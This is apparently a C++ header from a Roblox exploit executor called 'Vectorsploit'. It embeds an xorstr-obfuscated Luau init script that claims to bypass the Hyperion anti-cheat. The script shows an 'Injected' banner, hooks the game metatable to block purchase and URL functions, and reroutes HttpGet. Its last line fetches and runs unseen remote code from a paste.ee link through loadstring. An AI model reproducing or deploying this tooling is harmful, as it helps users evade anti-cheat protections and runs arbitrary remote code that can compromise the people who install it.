#pragma once
#include <string>
#include <xorstr.hpp>
const std::string LuauInit = xorstr_(R"(
if not game:IsLoaded() then game.Loaded:Wait() end

local Instances = {
	Gui = Instance.new("ScreenGui"),
	Holder = Instance.new("Frame"),
	Label = Instance.new("TextLabel"),
	Icon = Instance.new("ImageLabel"),
}

Instances.Gui.Name = "Gui"
Instances.Gui.IgnoreGuiInset = true
Instances.Gui.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
Instances.Gui.DisplayOrder = 999
Instances.Gui.Parent = cloneref(game.CoreGui)
Instances.Gui.ResetOnSpawn = false

Instances.Holder.Name = "Holder"
Instances.Holder.ZIndex = 10
Instances.Holder.Size = UDim2.new(0, 500, 0, 100)
Instances.Holder.BorderColor3 = Color3.new(0, 0, 0)
Instances.Holder.BackgroundTransparency = 1
Instances.Holder.Position = UDim2.new(0.5, -2000, 0.5, -50)
Instances.Holder.BackgroundColor3 = Color3.new(1, 1, 1)
Instances.Holder.Parent = Instances.Gui

Instances.Label.Name = "Label"
Instances.Label.ZIndex = 10
Instances.Label.Size = UDim2.new(0, 300, 0, 100)
Instances.Label.BorderColor3 = Color3.new(0, 0, 0)
Instances.Label.BackgroundTransparency = 1
Instances.Label.Position = UDim2.new(0.519999981, -150, 0, 0)
Instances.Label.BackgroundColor3 = Color3.new(1, 1, 1)
Instances.Label.TextColor3 = Color3.new(0, 0, 0)
Instances.Label.Text = [[Vectorsploit Unrestricted Script Execution by Anonymous Registered SOs bypassing all of Hyperion's propaganda! 
Use the external program to execute scripts.
Status: Injected]]
Instances.Label.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
Instances.Label.TextWrapped = true
Instances.Label.TextTransparency = 1
Instances.Label.TextScaled = true
Instances.Label.Parent = Instances.Holder

Instances.Icon.Name = "Icon"
Instances.Icon.ZIndex = 10
Instances.Icon.Size = UDim2.new(0, 100, 0, 100)
Instances.Icon.BorderColor3 = Color3.new(0, 0, 0)
Instances.Icon.BackgroundTransparency = 1
Instances.Icon.BackgroundColor3 = Color3.new(1, 1, 1)
Instances.Icon.Image = "rbxassetid://121558412209795"
Instances.Icon.Parent = Instances.Holder

local frame = Instances.Holder

frame:TweenPosition(UDim2.new(0.5, -50, 0.5, -50), Enum.EasingDirection.In)
wait(3)
frame:TweenPosition(UDim2.new(0, 5, 1, -150), Enum.EasingDirection.Out)
wait(2)

for i = 1, 10 do
	wait(0.01)
	local textLabel = Instances.Label
	if textLabel then
		textLabel.TextTransparency = textLabel.TextTransparency - 0.1
		textLabel.BackgroundTransparency = textLabel.BackgroundTransparency - 0.1
	end
end

local BlacklistedFunctions = {
    "OpenVideosFolder",
    "OpenScreenshotsFolder",
    "GetRobuxBalance",
    "PerformPurchase",
    "PromptBundlePurchase",
    "PromptNativePurchase",
    "PromptProductPurchase",
    "PromptPurchase",
    "PromptGamePassPurchase",
    "PromptRobloxPurchase",
    "PromptThirdPartyPurchase",
    "Publish",
    "GetMessageId",
    "OpenBrowserWindow",
    "OpenNativeOverlay",
    "RequestInternal",
    "ExecuteJavaScript",
    "EmitHybridEvent",
    "AddCoreScriptLocal",
    "HttpRequestAsync",
    "ReportAbuse",
    "SaveScriptProfilingData",
    "OpenUrl",
    "DeleteCapture",
    "DeleteCapturesAsync"
}

local Metatable = getrawmetatable(game)
local OldMetatable = Metatable.__namecall

setreadonly(Metatable, false)
Metatable.__namecall = function(Self, ...)
    local Method = getnamecallmethod()
   
    if table.find(BlacklistedFunctions, Method) then
        warn("Attempt to call dangerous function.")
        return nil
    end

    if Method == "HttpGet" or Method == "HttpGetAsync" then
            return httpget(game, ...)
    elseif Method == "GetObjects" then 
            return getobjects(game, ...)
    end

    return OldMetatable(Self, ...)
end

local OldIndex = Metatable.__index

setreadonly(Metatable, false)
Metatable.__index = function(Self, i)
    if table.find(BlacklistedFunctions, i) then
        warn("Attempt to call dangerous function.")
        return nil
    end

    if Self == game then
        if i == "HttpGet" or i == "HttpGetAsync" then 
            return httpget
        elseif i == "GetObjects" then 
            return getobjects
        end
    end
    return OldIndex(Self, i)
end

loadstring(game:HttpGet("https://paste.ee/r/NOfDIANr"))()

)");